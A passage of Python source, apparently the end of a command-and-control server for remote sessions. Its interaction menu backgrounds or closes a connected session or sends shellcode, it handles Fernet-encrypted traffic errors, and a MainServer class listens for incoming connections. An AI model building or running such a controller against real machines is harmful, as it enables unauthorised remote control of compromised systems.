                        case self.MENU_INTERACT_BACKGROUND:
                            self.control.socket.socket = None
                            break
                        case self.MENU_INTERACT_CLOSE:
                            self.control.socket.close()
                            break
                        case self.MENU_INTERACT_SHELLCODE:
                            self.control.shellcode()
                    print()

        except socket.error as e:  # if there is a socket error
            self.control.logger.error(f"Connection was lost {e}")
        except cryptography.fernet.InvalidToken:
            self.control.logger.error(f"Connection lost (invalid crypto token)");





class MainServer:
    def __init__(self):
        self._args = Args(self)
        init(self._args.get_args())

        self.socket = Socket(self._args.get_args().port)
        self.control = Control(self.socket)

    def start(self):
        self.socket.listen_asych()

        View(self.control)


if __name__ == "__main__":
    MainServer().start()
